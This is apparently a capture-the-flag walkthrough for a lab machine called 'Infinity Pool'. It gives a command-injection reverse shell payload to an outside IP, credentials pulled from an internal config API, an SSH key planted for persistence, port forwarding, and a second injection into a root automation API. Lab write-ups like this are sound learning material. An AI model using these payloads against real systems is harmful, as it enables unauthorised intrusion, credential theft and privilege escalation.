# Infinity Pool

<img width="1907" height="358" alt="image" src="https://github.com/user-attachments/assets/7dc1a41f-37dd-419b-a7ff-f996f96a3181" />

----

## namp scan

```ruby
└─$ nmap -sCV -Pn 10.113.176.27 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-09 06:48 UTC
Nmap scan report for 10.113.176.27
Host is up (0.067s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4b:5f:7d:92:1e:e4:f5:57:5a:21:82:2e:9c:51:a2:9b (ECDSA)
|_  256 0e:b0:b3:18:bd:22:76:8b:67:1e:59:38:3d:58:c5:7b (ED25519)
80/tcp open  http    Gunicorn
|_http-title: Byte Lotus &mdash; Stay Noticed
|_http-server-header: gunicorn
| http-robots.txt: 2 disallowed entries 
|_/internal/ /status
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.80 seconds

```

## op0en website 

<img width="1919" height="756" alt="image" src="https://github.com/user-attachments/assets/97a38fbf-2050-4c7f-807f-4d881dc779fd" />

## check `robots.txt`

<img width="844" height="229" alt="image" src="https://github.com/user-attachments/assets/8a995074-4065-4ddf-98f8-c37b3267d52a" />

## in `/status` found command injection 
 
<img width="1756" height="636" alt="image" src="https://github.com/user-attachments/assets/dac668e6-7903-43c4-a609-f456f72e9259" />

## get shell

```
127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.135.214/4444 0>&1'
```

<img width="1104" height="285" alt="image" src="https://github.com/user-attachments/assets/00d25fc9-b43a-4331-b4e8-afc7cb47ed29" />

---

## privesc

```
ss -tulnp
```

<img width="1281" height="421" alt="image" src="https://github.com/user-attachments/assets/a085fb3a-8472-4d99-98be-c8964491d3c4" />

## found Watchtower Service on Port 3000!

<img width="1016" height="436" alt="image" src="https://github.com/user-attachments/assets/096cd7b2-a46a-4b5b-914e-8f8757e34ef6" />

## Found Credentials in Watchtower Config!

```
curl -s http://127.0.0.1:3000/api/config
```

<img width="1665" height="153" alt="image" src="https://github.com/user-attachments/assets/26e359d4-1b80-4420-8087-917459175cdb" />

```
FreePBXUCPTemplateCreator : St4yN0t1c3d_2026
```

## Found Automation Service Running as Root

curl -s http://127.0.0.1:9000/health

<img width="1644" height="153" alt="image" src="https://github.com/user-attachments/assets/d10b2598-05ed-473a-8ab3-efdff466a3c7" />

---

tried to login to the UCP portal (`http://127.0.0.1:8080/ucp`) using `curl` commands, but it didn't work because:

1.  CSRF tokens: The login form requires a token

2.  JavaScript/AJAX: The login uses client-side JS that `curl` can't reproduce

Solution: Add an SSH key to get a proper shell, then forward the port to a browser:

```bash

# Add your SSH public key to the web user's authorized_keys
echo 'ssh-ed25519 AAAA...' >> ~/.ssh/authorized_keys

# Forward port 8080 to your machine
ssh -L 8080:127.0.0.1:8080 web@10.113.176.27

# Then open http://127.0.0.1:8080/ucp in your browser
```

```
ssh-keygen -t rsa -b 4096 -f id_rsa

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDOTSH9y4roNdRcXdqNeUCRkGkr3vTsh7RN4bNqi0zpl3xwhuqXX9k7NskYO5B3df63iekAs3auEQjDb+3TAxcY+TbDQjpxu6+HvbWYYaYSIR2LQXXyfTO284yYUcbFhzBEQXIiYBprWJ9qdYNrn3hd3qowi0iS+Jv/OiiBCjxhgOrvCghXUKsM/GGF+jZMZqY28NDey899gz6l+p1OnnOOAsVFrCuLN5igAQFRwNqPaWGzQIkLlkA3K+pTaZKEIoskp5IQUvqb3sIZoSj1whOiLhgbsQulE5TUGHJss7RLsmyW8fhyL9bwqUopxQjUEpgttWPiKtkoWRmrel4evMHfUPBpvtoAZ7/pmDJTkUEa5QqZnY32qzvLBZjfKnzQq8Kb+yeJUoLDCDaWva5aTRZih9tmoP7o/V1KWW5Ad+3wfY6IU6LxDB+XT/Z.................Gmr72a3IJcn1kiI5QlWCBB6vz/XzCda63vQx6v4LPDw== kali@kali" >> /home/web/.ssh/authorized_keys

chmod 700 /home/web/.ssh
chmod 600 /home/web/.ssh/authorized_keys

```

```
ssh -i id_rsa -L 8081:127.0.0.1:8080 web@10.113.176.27
```

Open the UCP Portal in Your Browser
-----------------------------------

Open your browser and go to:

```text

http://127.0.0.1:8081/ucp
```

<img width="1919" height="704" alt="image" src="https://github.com/user-attachments/assets/d250b6fe-314c-453c-84d5-99e32e4793df" />

### Login with:

```
Username: FreePBXUCPTemplateCreator
Password: St4yN0t1c3d_2026
```

Find the Automation Key
-----------------------

Inside the UCP dashboard:

1.  Look for Voicemail or Voicemail Inbox

2.  Find a voicemail entry (likely from extension 9000)

3.  Check the Caller ID field: it should contain:

    ```text

    Automation Key cc_auto_7b3f9a1c4e0d2f6a
    ```
Copy the key:  `cc_auto_7b3f9a1c4e0d2f6a`

 Test Command Execution (In the SSH Session)
---------------------------------------------------

```bash

curl -s -X POST http://127.0.0.1:9000/jobs/export\
 -H "Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a"\
 -H "Content-Type: application/json"\
 -d '{"report":"x.tgz /var/automation/data; id #"}'
```

<img width="1639" height="302" alt="image" src="https://github.com/user-attachments/assets/9a539586-0565-47b0-976f-697e2413240e" />

